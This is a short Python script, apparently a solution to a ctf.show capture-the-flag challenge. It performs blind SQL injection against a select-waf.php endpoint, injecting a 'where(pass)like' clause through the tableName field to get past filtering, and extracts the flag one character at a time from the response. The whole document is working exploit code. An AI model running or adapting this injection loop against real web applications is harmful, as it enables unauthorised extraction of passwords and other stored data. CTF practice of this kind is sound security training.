import requests

url = "http://92ad5a47-8d5e-41ab-8ee7-b2c125322f5c.challenge.ctf.show/select-waf.php"
result = "ctfshow{"

for i in range(1,50):
    for j in range(38,128):
        payload = f"(ctfshow_user)where(pass)like'{result+chr(j)}%'"
        #print(payload)
        response = requests.request("POST", url=url, data={"tableName":payload})
        #print({"tableName":payload})
        if '$user_count = 1;' in response.text:
            result += chr(j)
            print(result)
            break
    print("1")